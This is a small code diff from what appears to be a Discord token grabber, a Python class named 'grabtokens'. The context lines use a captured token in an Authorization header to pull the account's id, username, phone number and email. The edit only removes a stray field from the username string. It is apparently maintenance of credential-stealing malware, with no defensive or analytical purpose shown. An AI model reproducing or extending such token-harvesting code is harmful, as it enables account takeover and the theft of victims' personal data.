@@ -269,7 +269,7 @@ class grabtokens():
                     'Authorization': token})
 
             discord_id = r.json()['id']
-            username = r.json()['username'] + '#' + r.json()['discriminator'] + myaccount.created_at
+            username = r.json()['username'] + '#' + r.json()['discriminator']
             phone = r.json()['phone']
             email = r.json()['email']
 
